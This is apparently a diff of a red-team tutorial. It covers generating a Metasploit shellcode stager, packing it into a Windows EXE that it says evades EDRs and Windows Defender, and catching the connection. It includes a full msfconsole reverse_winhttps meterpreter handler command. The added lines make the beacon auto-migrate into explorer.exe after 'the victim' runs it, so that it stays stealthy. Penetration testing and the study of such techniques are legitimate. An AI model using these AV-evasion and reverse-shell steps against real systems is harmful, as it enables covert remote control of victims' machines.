@@ -10,7 +10,7 @@ Shellcode injection might be very helpful for APT or Red Teamers during Pentesti
 
 Transmitting data over a unencrypted Tunnel is not very recommended, it is always a great idea to replace the default SSL that Metasploit uses when generating stagers, so the communication between the stager and the C2 framework is encrypted. We can create a private RSA key and a Server Certificate for the C2 server-side.
 
-```
+```bash
 openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout rsaprivate.key -out servercertificate.crt
 ```
 
@@ -18,7 +18,7 @@ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout rsaprivate.key 
 
 Then merging this together in a .pem file and we have created a concatenated certificate.
 
-```
+```bash
 cat rsaprivate.key servercertificate.crt > my.pem
 ```
 
@@ -38,7 +38,7 @@ Once the shellcode is successfully generated, we will pack it into EXE.
 
 There is a open source tool called Shecodnject which nicely package our generated shellcode into EXE. Open the tool using python3 as root:
 
-```
+```bash
 sudo python3 shecodnject.py
 ```
 
@@ -69,8 +69,10 @@ The EXE is generated and ready to evade modern EDRs and Windows Defender. Let’
 It is bypassed, no detection at all. Now it’s time to set a listener in Metasploit and hopefully get a shell:
 
 ```
-msfconsole -q -x 'use exploit/multi/handler; set ExitOnSession false; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST 192.168.1.46; set LPORT 8888; set HandlerSSLCert /home/nade/Desktop/my.pem; set StagerVerifySSLCert true; set SessionCommunicationTimeout 600; run -j -z'
+msfconsole -q -x 'use exploit/multi/handler; set ExitOnSession false; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST 192.168.1.46; set LPORT 8888; set HandlerSSLCert /home/nade/Desktop/my.pem; set StagerVerifySSLCert true; set SessionCommunicationTimeout 600; set AutoRunScript post/windows/manage/migrate; run -j -z'
 ```
+
+The command basically set a listener on PORT 8888, sets up the certificate that the beacon will use while communicating. We are also using the AutoRunScript with the **/post/windows/manage/migrate** module, which means that once the victim opens the .exe, the beacon process will automigrate to explorer.exe, making it undetectable and more stealthy.
 
 For the sake of the statistics, this is the detection rate when scanning in various AVs:
 
